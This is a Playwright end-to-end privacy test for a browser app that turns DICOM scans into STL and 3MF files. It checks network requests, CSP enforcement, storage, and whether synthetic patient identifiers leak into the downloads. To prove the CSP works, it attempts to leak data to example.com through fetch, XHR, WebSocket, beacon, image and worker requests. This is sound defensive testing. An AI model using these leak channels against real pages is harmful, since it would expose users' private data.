// Privacy audit of a deployed copy (or the local build): proves, in a real browser, that scan data stays on the device.
//   node test/e2e/privacy.mjs <dicom-dir> [--url=https://…]
// Checks: every network request the page and its worker make while a study is read, converted and downloaded;
// whether the Content-Security-Policy really blocks outgoing connections (page AND blob worker); browser storage;
// and that planted identifiers do not appear in the downloaded files.
import { createRequire } from 'node:module';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { serve } from './serve.mjs';

const { chromium } = createRequire(import.meta.url)('playwright');
const args = process.argv.slice(2).filter((a) => !a.startsWith('--'));
const flags = Object.fromEntries(process.argv.slice(2).filter((a) => a.startsWith('--')).map((a) => a.slice(2).split('=')));
const walk = (d, l = []) => { for (const n of readdirSync(d)) { const p = join(d, n); statSync(p).isDirectory() ? walk(p, l) : l.push(p); } return l; };
const files = walk(resolve(args[0]));
const { server, url } = flags.url ? { server: { close() {} }, url: flags.url } : await serve('dist');

const browser = await chromium.launch({ args: ['--use-gl=angle', '--use-angle=swiftshader', '--enable-unsafe-swiftshader'] });
const context = await browser.newContext({ acceptDownloads: true });
const requests = [];
context.on('request', (r) => requests.push({ t: Date.now(), method: r.method(), url: r.url(), body: (r.postData() || '').length, type: r.resourceType(), req: r }));
// A request object can exist for something the browser then refuses to send; what matters is whether it was
// answered (it reached a server) or failed (blocked before leaving).
const outcome = new Map();
context.on('requestfailed', (r) => outcome.set(r, 'blocked: ' + (r.failure() ? r.failure().errorText : 'failed')));
context.on('response', (res) => outcome.set(res.request(), 'ANSWERED ' + res.status()));
const page = await context.newPage();
await page.goto(url);
await page.waitForLoadState('networkidle');
const tLoaded = Date.now();
const csp = await page.$eval('meta[http-equiv="Content-Security-Policy"]', (m) => m.content);

await page.setInputFiles('#in-files', files);
await page.waitForSelector('#dl-stl:not([disabled])', { timeout: 600000 });
const saved = {};
for (const [id, ext] of [['#dl-stl', 'stl'], ['#dl-3mf', '3mf']]) {
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click(id)]);
  saved[ext] = await dl.path();
  await page.waitForSelector(`${id}:not([disabled])`);
}
await page.waitForTimeout(1500);
const afterLoad = requests.filter((r) => r.t > tLoaded && !r.url.startsWith('blob:') && !r.url.startsWith('data:'));

// Can anything get out? Try from the page and from a blob worker (the engine runs in one).
const escape = await page.evaluate(async () => {
  const out = {};
  const violations = [];
  document.addEventListener('securitypolicyviolation', (e) => violations.push(`${e.violatedDirective} ${e.blockedURI}`));
  out.fetch = await fetch('https://example.com/?leak=1', { method: 'POST', body: 'x' }).then(() => 'SENT', (e) => 'blocked');
  out.fetchSameOrigin = await fetch(location.href, { method: 'POST', body: 'x' }).then(() => 'SENT', (e) => 'blocked');
  out.xhr = await new Promise((res) => { try { const x = new XMLHttpRequest(); x.onload = () => res('SENT'); x.onerror = () => res('blocked'); x.open('POST', 'https://example.com/'); x.send('x'); } catch { res('blocked'); } });
  out.websocket = await new Promise((res) => { try { const w = new WebSocket('wss://example.com/'); w.onopen = () => res('OPENED'); w.onerror = () => res('blocked'); } catch { res('blocked'); } });
  out.beacon = navigator.sendBeacon ? (navigator.sendBeacon('https://example.com/b', 'x') ? 'queued?' : 'blocked') : 'n/a';
  out.image = await new Promise((res) => { const i = new Image(); i.onload = () => res('LOADED'); i.onerror = () => res('blocked'); i.src = 'https://example.com/pixel.png?leak=1'; });
  out.worker = await new Promise((res) => {
    const src = 'fetch("https://example.com/?leak=worker",{method:"POST",body:"x"}).then(()=>postMessage("SENT"),()=>postMessage("blocked"))';
    try { const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' }))); w.onmessage = (e) => res(e.data); w.onerror = () => res('worker error'); } catch { res('blocked'); }
  });
  await new Promise((r) => setTimeout(r, 300));
  out.violations = violations.length;
  out.storage = {
    localStorage: localStorage.length, sessionStorage: sessionStorage.length, cookies: document.cookie.length,
    indexedDB: indexedDB.databases ? (await indexedDB.databases()).length : 'n/a',
    caches: 'caches' in self ? (await caches.keys()).length : 'n/a',
    serviceWorkers: navigator.serviceWorker ? (await navigator.serviceWorker.getRegistrations()).length : 'n/a',
  };
  return out;
});
const escaped = requests.filter((r) => r.url.includes('example.com'));

// Planted identifiers must not be in the downloads (meaningful with the synthetic phantoms: DOE^JANE, MRN1234567 …)
const needles = ['DOE', 'JANE', 'MRN1234567', 'ACC998877', 'SMITH', 'Test General', '19700101', '1.2.840', '1.2.826'];
const hits = {};
for (const [ext, p] of Object.entries(saved)) {
  let text = readFileSync(p).toString('latin1');
  if (ext === '3mf') {
    const { unzipSync } = createRequire(import.meta.url)(resolve('node_modules/fflate'));
    text = Object.entries(unzipSync(new Uint8Array(readFileSync(p)))).map(([n, b]) => n + '\n' + Buffer.from(b).toString('latin1').slice(0, 4000)).join('\n');
  } else text = text.slice(0, 84); // binary STL: only the 80-byte header + count can hold text
  hits[ext] = needles.filter((n) => text.includes(n));
}

console.log(JSON.stringify({
  url, filesGiven: files.length, csp,
  requestsDuringPageLoad: requests.filter((r) => r.t <= tLoaded).map((r) => `${r.method} ${r.url.replace(url, '/')} (${r.type})`),
  requestsAfterPageLoad: afterLoad.map((r) => `${r.method} ${r.url} body=${r.body}`),
  escapeAttempts: escape,
  escapeAttemptsSeenByTheNetworkStack: escaped.map((r) => `${r.method} ${r.url} (${r.type}) -> ${outcome.get(r.req) || 'no response'}`),
  escapeRequestsAnswered: escaped.filter((r) => String(outcome.get(r.req)).startsWith('ANSWERED')).length,
  identifiersInDownloads: hits,
  stlHeader: readFileSync(saved.stl).subarray(0, 80).toString('latin1').replace(/\0+$/, ''),
}, null, 1));
await browser.close();
server.close();
